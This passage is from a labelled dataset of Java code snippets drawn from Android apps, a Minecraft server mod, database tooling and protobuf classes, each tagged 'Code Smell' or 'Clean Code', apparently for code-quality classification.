        firstButton.setTextMultiLine(true);
        firstButton.setPadding(horizontalPadding,verticalPadding / 2,horizontalPadding,verticalPadding / 2);
      }
    }
    if (!dp.isTwoPanels) {
      availableWidth-=firstButton.getMeasuredWidth() + dp.dropTargetGapPx;
      widthSpec=MeasureSpec.makeMeasureSpec(availableWidth,MeasureSpec.AT_MOST);
    }
    secondButton.measure(widthSpec,heightSpec);
    if (!mIsVertical) {
      if (secondButton.isTextTruncated(availableWidth)) {
        secondButton.setIconVisible(false);
        firstButton.setIconVisible(false);
        secondButton.setTextMultiLine(true);
        secondButton.setPadding(horizontalPadding,verticalPadding / 2,horizontalPadding,verticalPadding / 2);
      }
    }
    float minTextSize=Math.min(firstButton.resizeTextToFit(),secondButton.resizeTextToFit());
    if (firstButton.getTextSize() != minTextSize || secondButton.getTextSize() != minTextSize) {
      firstButton.setTextSize(minTextSize);
      secondButton.setTextSize(minTextSize);
    }
  }
  setMeasuredDimension(width,height);
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite @Nullable public Entity changeDimension(ServerLevel arg){
  return this.changeDimension(arg,arg.getPortalForcer());
}
/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite(remap=false) @Nullable public Entity changeDimension(ServerLevel server,ITeleporter teleporter){
  if (!CommonHooks.onTravelToDimension((Entity)(Object)this,server.dimension()))   return null;
  if (this.level() instanceof ServerLevel && !this.isRemoved()) {
    this.level().getProfiler().push(""changeDimension"");
    if (server == null) {
      return null;
    }
    this.level().getProfiler().push(""reposition"");
    var bukkitPos=bridge$getLastTpPos();
    PortalInfo portalinfo=bukkitPos == null ? teleporter.getPortalInfo((Entity)(Object)this,server,this::findDimensionEntryPoint) : new PortalInfo(new Vec3(bukkitPos.x(),bukkitPos.y(),bukkitPos.z()),Vec3.ZERO,this.yRot,this.xRot);
    if (portalinfo == null) {
      return null;
    }
 else {
      ServerLevel world=((PortalInfoBridge)portalinfo).bridge$getWorld() == null ? server : ((PortalInfoBridge)portalinfo).bridge$getWorld();
      if (world == this.level()) {
        this.moveTo(portalinfo.pos.x,portalinfo.pos.y,portalinfo.pos.z,portalinfo.yRot,this.getXRot());
        this.setDeltaMovement(portalinfo.speed);
        return (Entity)(Object)this;
      }
      this.unRide();
      Entity transportedEntity=teleporter.placeEntity((Entity)(Object)this,(ServerLevel)this.level(),world,this.getYRot(),spawnPortal -> {
        this.level().getProfiler().popPush(""reloading"");
        Entity entity=this.getType().create(world);
        if (entity != null) {
          entity.restoreFrom((Entity)(Object)this);
          entity.moveTo(portalinfo.pos.x,portalinfo.pos.y,portalinfo.pos.z,portalinfo.yRot,entity.getXRot());
          entity.setDeltaMovement(portalinfo.speed);
          if (this.bridge$isInWorld()) {
            world.addDuringTeleport(entity);
            if (((WorldBridge)world).bridge$getTypeKey() == LevelStem.END) {
              ArclightCaptures.captureEndPortalEntity((Entity)(Object)this,spawnPortal);
              ServerLevel.makeObsidianPlatform(world);
            }
          }
        }
        return entity;
      }
);
      this.removeAfterChangingDimensions();
      this.level().getProfiler().pop();
      ((ServerLevel)this.level()).resetEmptyTime();
      world.resetEmptyTime();
      this.level().getProfiler().pop();
      return transportedEntity;
    }
  }
 else {
    return null;
  }
}",1,Code Smell
"@Override protected List<TableRangeInfo<K>> calculateRanges(String quoteTableWithSchema,K preMaxPriKey,K maxPriKey) throws IOException, InterruptedException {
  final ArrayList<TableRangeInfo<K>> singleTableRangeList=new ArrayList<>();
  K currentMaxPriKey=preMaxPriKey;
  DbShardWithConn oneShard;
  long currentSplitNum=0L;
  long st=System.currentTimeMillis();
  final double timeInterval=60.0;
  boolean statementRefresh=true;
  while (compareSplitKey(currentMaxPriKey,maxPriKey) < 0) {
    oneShard=pickOneShard();
    for (int i=0; i < RETRY_NUM; i++) {
      try {
        String cacheIndex=quoteTableWithSchema + ""_"" + preMaxPriKey.toString();
        Pair<K,K> range=cache.get(cacheIndex);
        if (range == null) {
          currentMaxPriKey=getOneSplitMaxPrimaryKey(oneShard,quoteTableWithSchema,preMaxPriKey,statementRefresh);
          statementRefresh=false;
          if (currentMaxPriKey.equals(maxPriKey)) {
            currentMaxPriKey=addDeltaToKey(maxPriKey);
          }
          if (compareSplitKey(currentMaxPriKey,preMaxPriKey) <= 0) {
            log.info(""Current max PK {} is not more than previous PK {}. Ignore this range and fetch next slave."",currentMaxPriKey,preMaxPriKey);
            continue;
          }
          range=new Pair<>(preMaxPriKey,currentMaxPriKey);
          cache.set(cacheIndex,range);
          if (currentSplitNum % FETCH_RANGE_SLEEP_SIZE == 0) {
            log.debug(""["" + Thread.currentThread().getName() + ""] Current split num: ""+ currentSplitNum+ "" Have a relax, sleep for 1s..."");
            Thread.sleep(FETCH_RANGE_SLEEP_INTERVAL);
            fetchRangeSleepTime++;
          }
        }
 else {
          currentMaxPriKey=range.getSecond();
          if (currentMaxPriKey.equals(maxPriKey)) {
            currentMaxPriKey=addDeltaToKey(maxPriKey);
          }
        }
        singleTableRangeList.add(new TableRangeInfo<>(quoteTableWithSchema,range));
        preMaxPriKey=currentMaxPriKey;
        currentSplitNum++;
        break;
      }
 catch (      SQLException e) {
        log.error(""Fetch primary key range failure, due to "" + e.getMessage() + "", sql: ""+ getFetchSQLFormat()+ "", last primary key: ""+ preMaxPriKey+ "", try num ""+ i+ ""\tInstance info: ""+ oneShard.getShardInfo(),e);
        if (i == RETRY_NUM - 1) {
          throw new IOException(""Fetch primary key range failure! DB instance info: "" + oneShard.getShardInfo(),e);
        }
        try {
          Thread.sleep(i * RETRY_BASE_TIME_DURATION);
          fetchRangeSleepTime++;
        }
 catch (        InterruptedException e1) {
          log.error(""Retry has been Interrupted..."",e);
          throw new IOException(""Fetch primary key range failure!"",e);
        }
        oneShard.reconnect();
      }
    }
    long currentTime=System.currentTimeMillis();
    getOneSplitMaxPrimaryKeyCount++;
    double time=TimeUnit.MILLISECONDS.toSeconds(currentTime - st);
    if (time >= timeInterval) {
      st=currentTime;
      logCurrentProcess(quoteTableWithSchema,maxPriKey,currentMaxPriKey,oneShard);
    }
  }
  return singleTableRangeList;
}",1,Code Smell
"/** 
 * @see ZipEncoding#encode(java.lang.String)
 */
@Override public ByteBuffer encode(final String name){
  final CharsetEncoder enc=newEncoder();
  final CharBuffer cb=CharBuffer.wrap(name);
  CharBuffer tmp=null;
  ByteBuffer out=ByteBuffer.allocate(estimateInitialBufferSize(enc,cb.remaining()));
  while (cb.hasRemaining()) {
    final CoderResult res=enc.encode(cb,out,false);
    if (res.isUnmappable() || res.isMalformed()) {
      final int spaceForSurrogate=estimateIncrementalEncodingSize(enc,6 * res.length());
      if (spaceForSurrogate > out.remaining()) {
        int charCount=0;
        for (int i=cb.position(); i < cb.limit(); i++) {
          charCount+=!enc.canEncode(cb.get(i)) ? 6 : 1;
        }
        final int totalExtraSpace=estimateIncrementalEncodingSize(enc,charCount);
        out=ZipEncodingHelper.growBufferBy(out,totalExtraSpace - out.remaining());
      }
      if (tmp == null) {
        tmp=CharBuffer.allocate(6);
      }
      for (int i=0; i < res.length(); ++i) {
        out=encodeFully(enc,encodeSurrogate(tmp,cb.get()),out);
      }
    }
 else     if (res.isOverflow()) {
      final int increment=estimateIncrementalEncodingSize(enc,cb.remaining());
      out=ZipEncodingHelper.growBufferBy(out,increment);
    }
 else     if (res.isUnderflow() || res.isError()) {
      break;
    }
  }
  enc.encode(cb,out,true);
  out.limit(out.position());
  out.rewind();
  return out;
}",1,Code Smell
"@SuppressLint(""NotifyDataSetChanged"") private void showColorList(boolean show){
  if (isColorListShown != show) {
    isColorListShown=show;
    if (toolsTransformAnimation != null) {
      toolsTransformAnimation.cancel();
    }
    toolsTransformAnimation=new SpringAnimation(new FloatValueHolder(show ? 0 : 1000f));
    toolsTransformAnimation.setSpring(new SpringForce().setFinalPosition(show ? 1000f : 0f).setStiffness(1250f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY));
    boolean[] moveBottomLayout=new boolean[]{keyboardVisible || emojiViewVisible};
    float bottomLayoutTranslationY=bottomLayout.getTranslationY();
    View barView=getBarView();
    toolsTransformAnimation.addUpdateListener((animation,value,velocity) -> {
      toolsTransformProgress=value / 1000f;
      float scale=0.6f + 0.4f * (1f - toolsTransformProgress);
      barView.setScaleX(scale);
      barView.setScaleY(scale);
      barView.setTranslationY(AndroidUtilities.dp(16) * Math.min(toolsTransformProgress,0.25f) / 0.25f);
      barView.setAlpha(1f - Math.min(toolsTransformProgress,0.25f) / 0.25f);
      colorsListView.setProgress(toolsTransformProgress,show);
      doneButton.setProgress(toolsTransformProgress);
      cancelButton.setProgress(toolsTransformProgress);
      tabsLayout.setTranslationY(AndroidUtilities.dp(32) * toolsTransformProgress);
      if (adjustPanLayoutHelper.animationInProgress()) {
        moveBottomLayout[0]=false;
      }
      if (moveBottomLayout[0]) {
        float progress=show ? toolsTransformProgress : 1f - toolsTransformProgress;
        bottomLayout.setTranslationY(bottomLayoutTranslationY - AndroidUtilities.dp(40) * progress * (show ? 1 : -1));
      }
      bottomLayout.invalidate();
      if (barView == textOptionsView) {
        overlayLayout.invalidate();
      }
    }
);
    toolsTransformAnimation.addEndListener((animation,canceled,value,velocity) -> {
      if (animation == toolsTransformAnimation) {
        toolsTransformAnimation=null;
        if (!show) {
          colorsListView.setVisibility(GONE);
          PersistColorPalette.getInstance(currentAccount).saveColors();
          colorsListView.getAdapter().notifyDataSetChanged();
        }
      }
    }
);
    toolsTransformAnimation.start();
    if (show) {
      colorsListView.setVisibility(VISIBLE);
      colorsListView.setSelectedColorIndex(0);
    }
  }
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  Arguments arguments=Arguments.fromArgs(args);
  int repetitions=arguments.getInteger(""bench_repetitions"",""number of repetitions"",10);
  int nrTileReads=arguments.getInteger(""bench_nr_tile_reads"",""number of tiles to read"",500_000);
  int preWarms=arguments.getInteger(""bench_pre_warms"",""number of pre warm runs"",3);
  List<Path> mbtilesPaths=arguments.getList(""bench_mbtiles"",""the mbtiles file to read from"",List.of()).stream().map(Paths::get).toList();
  if (mbtilesPaths.isEmpty()) {
    throw new IllegalArgumentException(""pass one or many paths to the same mbtiles file"");
  }
  mbtilesPaths.stream().forEach(p -> {
    if (!Files.exists(p) || !Files.isRegularFile(p)) {
      throw new IllegalArgumentException(""%s does not exists"".formatted(p));
    }
  }
);
  List<TileCoord> randomCoordsToFetchPerRepetition=new LinkedList<>();
  do {
    try (var db=Mbtiles.newReadOnlyDatabase(mbtilesPaths.getFirst())){
      try (var statement=db.connection().prepareStatement(SELECT_RANDOM_COORDS)){
        statement.setInt(1,nrTileReads - randomCoordsToFetchPerRepetition.size());
        var rs=statement.executeQuery();
        while (rs.next()) {
          int x=rs.getInt(""tile_column"");
          int y=rs.getInt(""tile_row"");
          int z=rs.getInt(""zoom_level"");
          randomCoordsToFetchPerRepetition.add(TileCoord.ofXYZ(x,(1 << z) - 1 - y,z));
        }
      }
     }
   }
 while (randomCoordsToFetchPerRepetition.size() < nrTileReads);
  Map<Path,Double> avgReadOperationsPerSecondPerDb=new HashMap<>();
  for (  Path dbPath : mbtilesPaths) {
    List<ReadResult> results=new LinkedList<>();
    LOGGER.info(""working on {}"",dbPath);
    for (int preWarm=0; preWarm < preWarms; preWarm++) {
      readEachTile(randomCoordsToFetchPerRepetition,dbPath);
    }
    for (int rep=0; rep < repetitions; rep++) {
      results.add(readEachTile(randomCoordsToFetchPerRepetition,dbPath));
    }
    var readOperationsPerSecondStats=results.stream().mapToDouble(ReadResult::readOperationsPerSecond).summaryStatistics();
    LOGGER.info(""readOperationsPerSecondStats: {}"",readOperationsPerSecondStats);
    avgReadOperationsPerSecondPerDb.put(dbPath,readOperationsPerSecondStats.getAverage());
  }
  List<Path> keysSorted=avgReadOperationsPerSecondPerDb.entrySet().stream().sorted((o1,o2) -> o1.getValue().compareTo(o2.getValue())).map(Map.Entry::getKey).toList();
  LOGGER.info(""diffs"");
  for (int i=0; i < keysSorted.size() - 1; i++) {
    for (int j=i + 1; j < keysSorted.size(); j++) {
      Path db0=keysSorted.get(i);
      double avg0=avgReadOperationsPerSecondPerDb.get(db0);
      Path db1=keysSorted.get(j);
      double avg1=avgReadOperationsPerSecondPerDb.get(db1);
      double diff=avg1 * 100 / avg0 - 100;
      LOGGER.info(""\""{}\"" to \""{}\"": avg read operations per second improved by {}%"",db0,db1,diff);
    }
  }
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      final long[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float hMin=ANIMATE_PICKER_SIZES ? pickerMinHeight : chartData.minValue;
        float yPercentage=(y[i] - hMin) / (h - hMin);
        float yPoint=(1f - yPercentage) * pikerHeight;
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"/** 
 * Seeks to the specified position in microseconds.
 * @param positionUs The seek position in microseconds.
 */
public void seekToUs(long positionUs){
  lastSeekPositionUs=positionUs;
  if (isPendingReset()) {
    pendingResetPositionUs=positionUs;
    return;
  }
  BaseMediaChunk seekToMediaChunk=null;
  for (int i=0; i < mediaChunks.size(); i++) {
    BaseMediaChunk mediaChunk=mediaChunks.get(i);
    long mediaChunkStartTimeUs=mediaChunk.startTimeUs;
    if (mediaChunkStartTimeUs == positionUs && mediaChunk.clippedStartTimeUs == C.TIME_UNSET) {
      seekToMediaChunk=mediaChunk;
      break;
    }
 else     if (mediaChunkStartTimeUs > positionUs) {
      break;
    }
  }
  boolean seekInsideBuffer;
  primarySampleQueue.rewind();
  if (seekToMediaChunk != null) {
    seekInsideBuffer=primarySampleQueue.setReadPosition(seekToMediaChunk.getFirstSampleIndex(0));
    decodeOnlyUntilPositionUs=0;
  }
 else {
    seekInsideBuffer=primarySampleQueue.advanceTo(positionUs,true,positionUs < getNextLoadPositionUs()) != SampleQueue.ADVANCE_FAILED;
    decodeOnlyUntilPositionUs=lastSeekPositionUs;
  }
  if (seekInsideBuffer) {
    nextNotifyPrimaryFormatMediaChunkIndex=primarySampleIndexToMediaChunkIndex(primarySampleQueue.getReadIndex(),0);
    for (    SampleQueue embeddedSampleQueue : embeddedSampleQueues) {
      embeddedSampleQueue.rewind();
      embeddedSampleQueue.advanceTo(positionUs,true,false);
    }
  }
 else {
    pendingResetPositionUs=positionUs;
    loadingFinished=false;
    mediaChunks.clear();
    nextNotifyPrimaryFormatMediaChunkIndex=0;
    if (loader.isLoading()) {
      loader.cancelLoading();
    }
 else {
      loader.clearFatalError();
      primarySampleQueue.reset();
      for (      SampleQueue embeddedSampleQueue : embeddedSampleQueues) {
        embeddedSampleQueue.reset();
      }
    }
  }
}",1,Code Smell
"@Override public void onWebAppSwitchInlineQuery(TLRPC.User botUser,String query,List<String> chatTypes){
  if (chatTypes.isEmpty()) {
    if (parentActivity instanceof LaunchActivity) {
      BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
      if (lastFragment instanceof ChatActivity) {
        ((ChatActivity)lastFragment).getChatActivityEnterView().setFieldText(""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
        dismiss();
      }
    }
  }
 else {
    Bundle args=new Bundle();
    args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_START_ATTACH_BOT);
    args.putBoolean(""onlySelect"",true);
    args.putBoolean(""allowGroups"",chatTypes.contains(""groups""));
    args.putBoolean(""allowUsers"",chatTypes.contains(""users""));
    args.putBoolean(""allowChannels"",chatTypes.contains(""channels""));
    args.putBoolean(""allowBots"",chatTypes.contains(""bots""));
    DialogsActivity dialogsActivity=new DialogsActivity(args);
    AndroidUtilities.hideKeyboard(frameLayout);
    OverlayActionBarLayoutDialog overlayActionBarLayoutDialog=new OverlayActionBarLayoutDialog(context,resourcesProvider);
    dialogsActivity.setDelegate((fragment,dids,message1,param,topicsFragment) -> {
      long did=dids.get(0).dialogId;
      Bundle args1=new Bundle();
      args1.putBoolean(""scrollToTopOnResume"",true);
      if (DialogObject.isEncryptedDialog(did)) {
        args1.putInt(""enc_id"",DialogObject.getEncryptedChatId(did));
      }
 else       if (DialogObject.isUserDialog(did)) {
        args1.putLong(""user_id"",did);
      }
 else {
        args1.putLong(""chat_id"",-did);
      }
      args1.putString(""inline_query_input"",""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
      if (parentActivity instanceof LaunchActivity) {
        BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
        if (MessagesController.getInstance(currentAccount).checkCanOpenChat(args1,lastFragment)) {
          overlayActionBarLayoutDialog.dismiss();
          dismissed=true;
          AndroidUtilities.cancelRunOnUIThread(pollRunnable);
          webViewContainer.destroyWebView();
          NotificationCenter.getInstance(currentAccount).removeObserver(BotWebViewSheet.this,NotificationCenter.webViewResultSent);
          NotificationCenter.getGlobalInstance().removeObserver(BotWebViewSheet.this,NotificationCenter.didSetNewTheme);
          BotWebViewSheet.super.dismiss();
          lastFragment.presentFragment(new INavigationLayout.NavigationParams(new ChatActivity(args1)).setRemoveLast(true));
        }
      }
      return true;
    }
);
    overlayActionBarLayoutDialog.show();
    overlayActionBarLayoutDialog.addFragment(dialogsActivity);
  }
}",1,Code Smell
"private static boolean move(int[][] mat,int row,int col,int player){
  mat[row][col]=player;
  boolean win=true;
  for (int i=0; i < mat[0].length; i++) {
    if (mat[row][i] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  win=true;
  for (int i=0; i < mat.length; i++) {
    if (mat[i][col] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  win=true;
  if (row == col) {
    for (int i=0; i < mat.length; i++) {
      if (mat[i][i] != player) {
        win=false;
        break;
      }
    }
  }
  if (win) {
    return true;
  }
  win=true;
  for (int i=mat.length - 1, j=0; i >= 0 && j < mat[0].length; i--, j++) {
    if (mat[i][j] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  return false;
}",1,Code Smell
"public void showWithAction(long did,int action,Runnable actionRunnable){
  showWithAction(did,action,null,null,actionRunnable,null);
}
public void showWithAction(long did,int action,Object infoObject){
  showWithAction(did,action,infoObject,null,null,null);
}
public void showWithAction(long did,int action,Runnable actionRunnable,Runnable cancelRunnable){
  showWithAction(did,action,null,null,actionRunnable,cancelRunnable);
}
public void showWithAction(long did,int action,Object infoObject,Runnable actionRunnable,Runnable cancelRunnable){
  showWithAction(did,action,infoObject,null,actionRunnable,cancelRunnable);
}
public void showWithAction(long did,int action,Object infoObject,Object infoObject2,Runnable actionRunnable,Runnable cancelRunnable){
  ArrayList<Long> ids=new ArrayList<>();
  ids.add(did);
  showWithAction(ids,action,infoObject,infoObject2,actionRunnable,cancelRunnable);
}
public void showWithAction(ArrayList<Long> dialogIds,int action,Object infoObject,Object infoObject2,Runnable actionRunnable,Runnable cancelRunnable){
}",1,Code Smell
"@Override public void generateDatabase(TiDBGlobalState globalState) throws Exception {
  for (int i=0; i < Randomly.fromOptions(1,2); i++) {
    boolean success;
    do {
      SQLQueryAdapter qt=new TiDBTableGenerator().getQuery(globalState);
      success=globalState.executeStatement(qt);
    }
 while (!success);
  }
  StatementExecutor<TiDBGlobalState,Action> se=new StatementExecutor<>(globalState,Action.values(),TiDBProvider::mapActions,(q) -> {
    if (globalState.getSchema().getDatabaseTables().isEmpty()) {
      throw new IgnoreMeException();
    }
  }
);
  try {
    se.executeStatements();
  }
 catch (  SQLException e) {
    if (e.getMessage().contains(""references invalid table(s) or column(s) or function(s) or definer/invoker of view lack rights to use them"")) {
      throw new IgnoreMeException();
    }
 else {
      throw new AssertionError(e);
    }
  }
  if (globalState.getDbmsSpecificOptions().getTestOracleFactory().stream().anyMatch((o) -> o == TiDBOracleFactory.CERT)) {
    globalState.executeStatement(new SQLQueryAdapter(""SET @@sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';""));
    ExpectedErrors errors=new ExpectedErrors();
    TiDBErrors.addExpressionErrors(errors);
    for (    TiDBTable table : globalState.getSchema().getDatabaseTables()) {
      if (!table.isView()) {
        globalState.executeStatement(new SQLQueryAdapter(""ANALYZE TABLE "" + table.getName() + "";"",errors));
      }
    }
  }
  if (globalState.getDbmsSpecificOptions().tiflash) {
    ExpectedErrors errors=new ExpectedErrors();
    TiDBErrors.addExpressionErrors(errors);
    for (    TiDBTable table : globalState.getSchema().getDatabaseTables()) {
      if (!table.isView()) {
        globalState.executeStatement(new SQLQueryAdapter(""ALTER TABLE "" + table.getName() + "" SET TIFLASH REPLICA 1;"",errors));
      }
    }
    if (Randomly.getBoolean()) {
      globalState.executeStatement(new SQLQueryAdapter(""set @@tidb_enforce_mpp=1;""));
    }
  }
}",1,Code Smell
"public static String parseCycleUnit(String scheduleTime){
  String cycleUnit=""D"";
  StringTokenizer st=new StringTokenizer(scheduleTime,"" "");
  if (st.countTokens() <= 0) {
    return ""D"";
  }
  int index=0;
  while (st.hasMoreElements()) {
    String currentString=st.nextToken();
    if (currentString.contains(""/"")) {
      if (index == 1) {
        cycleUnit=""10m"";
      }
 else       if (index == 2) {
        cycleUnit=""h"";
      }
      break;
    }
    if (currentString.equals(""*"")) {
      if (index == 3) {
        cycleUnit=""D"";
      }
      break;
    }
    index++;
  }
  logger.info(""ScheduleTime: "" + scheduleTime + "", cycleUnit: ""+ cycleUnit);
  return cycleUnit;
}",1,Code Smell
"public GProRetentionGuildListRsp(){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
}
public GProRetentionGuildListRsp(ArrayList<GProRetentionChannelInfo> arrayList,int i2,byte[] bArr,boolean z){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
  this.recommendChannels=arrayList;
  this.nextTs=i2;
  this.cookies=bArr;
  this.isEnd=z;
}",0,Clean Code
"public static RollRogueBuffScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),data).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.LeafNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.LeafNodeProto other=(org.tribuo.common.tree.protos.LeafNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (hasOutput() != other.hasOutput())   return false;
  if (hasOutput()) {
    if (!getOutput().equals(other.getOutput()))     return false;
  }
  if (!internalGetScore().equals(other.internalGetScore()))   return false;
  if (getGeneratesProbabilities() != other.getGeneratesProbabilities())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public FarmStageGachaInfo clone(){
  return new FarmStageGachaInfo().copyFrom(this);
}
",0,Clean Code
"private boolean isCollapseMiuiTitleApps(){
  return mPrefsMap.getStringAsInt(""various_collapse_miui_title"",0) != 0 && collapseMiuiTitleApps.contains(mPackageName);
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(worldLevel);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(wave);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cocoonId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(propEntityId);
  }
  return size;
}",0,Clean Code
"public LocalStackContainer(DockerImageName dockerImageName){
  super(dockerImageName);
  withCreateContainerCmdModifier(cmd -> cmd.withEntrypoint(""sh""));
  setCommand(""-c"",""while [ ! -f "" + STARTER_SCRIPT + "" ]; do sleep 0.1; done; ""+ STARTER_SCRIPT);
  withEnv(""LOCALSTACK_HOST"",""localhost.localstack.cloud"");
  withEnv(""SERVICES"",""opensearch"");
}",0,Clean Code
"/** 
 * Start preloading the widget.
 */
private boolean preloadWidget(){
  final LauncherAppWidgetProviderInfo pInfo=mInfo.info;
  if (pInfo.isCustomWidget()) {
    return false;
  }
  final Bundle options=mInfo.getDefaultSizeOptions(mLauncher);
  if (mInfo.getHandler().needsConfigure()) {
    mInfo.bindOptions=options;
    return false;
  }
  mBindWidgetRunnable=new Runnable(){
    @Override public void run(){
      mWidgetLoadingId=mLauncher.getAppWidgetHolder().allocateAppWidgetId();
      if (LOGD) {
        Log.d(TAG,""Binding widget, id: "" + mWidgetLoadingId);
      }
      if (new WidgetManagerHelper(mLauncher).bindAppWidgetIdIfAllowed(mWidgetLoadingId,pInfo,options)) {
        mHandler.post(mInflateWidgetRunnable);
      }
    }
  }
;
  mInflateWidgetRunnable=new Runnable(){
    @Override public void run(){
      if (LOGD) {
        Log.d(TAG,""Inflating widget, id: "" + mWidgetLoadingId);
      }
      if (mWidgetLoadingId == -1) {
        return;
      }
      AppWidgetHostView hostView=mLauncher.getAppWidgetHolder().createView((Context)mLauncher,mWidgetLoadingId,pInfo);
      mInfo.boundWidget=hostView;
      mWidgetLoadingId=-1;
      hostView.setVisibility(View.INVISIBLE);
      int[] unScaledSize=mLauncher.getWorkspace().estimateItemSize(mInfo);
      DragLayer.LayoutParams lp=new DragLayer.LayoutParams(unScaledSize[0],unScaledSize[1]);
      lp.x=lp.y=0;
      lp.customPosition=true;
      hostView.setLayoutParams(lp);
      if (LOGD) {
        Log.d(TAG,""Adding host view to drag layer"");
      }
      mLauncher.getDragLayer().addView(hostView);
      mView.setTag(mInfo);
    }
  }
;
  if (LOGD) {
    Log.d(TAG,""About to bind/inflate widget"");
  }
  mHandler.post(mBindWidgetRunnable);
  return true;
}",0,Clean Code
"@Override public SingleCallGraphRootTreeNode getRootNode(){
  return (SingleCallGraphRootTreeNode)getAbstractRootNode();
}
",0,Clean Code
"@Override protected Boolean computeValue(Class<?> type){
  try {
    return (boolean)IS_RECORD.invoke(type);
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected RecordComponent[] computeValue(Class<?> type){
  try {
    MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
    Object[] components=(Object[])GET_RECORD_COMPONENTS.invoke(type);
    RecordComponent[] recordComponents=new RecordComponent[components.length];
    for (int i=0; i < components.length; i++) {
      Object component=components[i];
      Method accessor=(Method)GET_ACCESSOR.invoke(component);
      Class<?> fieldType=(Class<?>)GET_TYPE.invoke(component);
      MethodHandle handle=lookup.unreflect(accessor);
      Object getter=_JDKAccess.makeGetterFunction(lookup,handle,fieldType);
      recordComponents[i]=new RecordComponent((Class<?>)GET_DECLARING_RECORD.invoke(component),(String)GET_NAME.invoke(component),fieldType,(Type)GET_GENERIC_TYPE.invoke(component),accessor,getter);
    }
    return recordComponents;
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected Tuple2<Constructor,MethodHandle> computeValue(Class<?> type){
  RecordComponent[] components=RecordUtils.getRecordComponents(type);
  if (components == null) {
    return null;
  }
  Class<?>[] paramTypes=Arrays.stream(components).map(RecordComponent::getType).toArray(Class<?>[]::new);
  Constructor constructor;
  try {
    constructor=type.getDeclaredConstructor(paramTypes);
  }
 catch (  NoSuchMethodException e) {
    throw new RuntimeException(e);
  }
  MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
  if (lookup != null) {
    try {
      MethodHandle handle=lookup.findConstructor(type,MethodType.methodType(void.class,paramTypes));
      return Tuple2.of(constructor,handle);
    }
 catch (    NoSuchMethodException|IllegalAccessException e) {
      return Tuple2.of(constructor,null);
    }
  }
 else {
    return Tuple2.of(constructor,null);
  }
}",0,Clean Code
"public static SceneEntityInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),data).checkInitialized();
}
